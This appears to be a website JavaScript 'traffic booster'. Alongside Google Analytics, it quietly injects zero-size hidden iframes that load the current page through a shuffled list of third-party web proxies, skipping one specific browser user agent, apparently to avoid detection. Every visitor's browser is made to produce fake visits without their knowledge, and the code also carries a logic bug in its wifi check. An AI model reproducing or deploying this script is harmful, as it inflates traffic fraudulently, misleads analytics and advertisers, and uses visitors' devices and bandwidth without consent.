/** Script By Dimas Lanjaka (L3n4r0x) **/

(function(i, s, o, g, r, a, m) {
  i['GoogleAnalyticsObject'] = r;
  i[r] = i[r] || function() {
    (i[r].q = i[r].q || []).push(arguments)
  }, i[r].l = 1 * new Date();
  a = s.createElement(o),
    m = s.getElementsByTagName(o)[0];
  a.async = 1;
  a.src = g;
  m.parentNode.insertBefore(a, m)
})(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

ga('create', 'UA-106238155-1', 'auto');
ga('send', 'pageview');

var typeConnection, connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

function ConnectionStatus() {
  if (typeof connection.type != 'undefined') {
    typeConnection = connection.type;
  } else if (typeof connection.effectiveType != 'undefined') {
    typeConnection = connection.effectiveType;
  }
  if (typeof ga == 'function') {
    ga('send', {
      hitType: 'event',
      eventCategory: 'Network',
      eventAction: 'Change',
      eventLabel: typeof typeConnection != 'undefined' ? typeConnection : 'State'
    });
  }
  if (typeof typeConnection != 'undefined') {
    if (typeConnection == '4g') {
      return '4g';
    } else if (typeConnection == 'wifi') {
      return 'wifi';
    } else if (typeConnection == 'cellular') {
      return 'cellular';
    } else if (typeConnection == 'none') {
      return false;
    }
  }
  return false;
}
connection.addEventListener('typechange', ConnectionStatus);
var webProxy = [
  'https://siiam.es/plugins/QuickWebProxy/miniProxy.php?http://',
  'https://tclhosting.com/test/miniProxy.php?http://',
  'https://www.freenixsecurity.net/phpproxy.php?http://',
  'http://media.mailadam.com/proxy/index.php?http://',
  'https://pfuenzle.io/proxy/index.php?http://',
  'http://198.199.74.234/miniProxy.php/http://',
  'https://recolic.net/miniProxy.php?http://',
  'http://butacaencasa.net/tsro.php/http://',
  'https://beta.sigcar.es/bin/proxy.php?http://',
  'http://dev.mu3.us/_pets/_tools/proxy.php?http://',
  'https://googleweblight.com/?lite_url=http://',
  'https://googleweblight.com/i?u=http://',
  'https://cpffreight.com/ipk.cgi/zh/10/http/',
  'https://epicgamestop.net/ipk.cgi/fr/10/http/',
  'https://thestatehost.com/anonimous/anonimous.ip/eddiekidiw/00/http/',
  'https://miniproxy-php.appspot.com/index.php?http://'
];
var indexer = 0;
shuffle(webProxy).forEach(function(e) {
  if (!e.match(/^https\:\/\//g) && location.protocol == 'https:') {
    return;
  }
  indexer++;
  if (ConnectionStatus != 'wifi' && indexer >= 5) {
    return;
  }
  var homepage = location.href.replace(/^https?\:\/\//g, '');
  if (location.host == 'cdpn.io') {
    var homepage = 'webmanajemen.com';
  }
  if (typeof ga == 'function') {
    ga('send', {
      hitType: 'event',
      eventCategory: 'Traffic_Booster',
      eventAction: 'Iframe',
      eventLabel: e + homepage
    });
  }
  var ifr = document.createElement('iframe');
  ifr.frameborder = '0';
  ifr.src = e + homepage;
  if (location.host != 'cdpn.io') {
    ifr.style = 'width:0px;height:0px';
  } else if (!location.host.match(/google\./g)) {
    ifr.style = 'width:100%;border:0';
  }
  if (navigator.userAgent != 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36') {
    document.body.appendChild(ifr);
  }
});

/**
 * Shuffles array in place.
 * @param {Array} a items An array containing the items.
 */
function shuffle(a) {
  var j, x, i;
  for (i = a.length - 1; i > 0; i--) {
    j = Math.floor(Math.random() * (i + 1));
    x = a[i];
    a[i] = a[j];
    a[j] = x;
  }
  return a;
}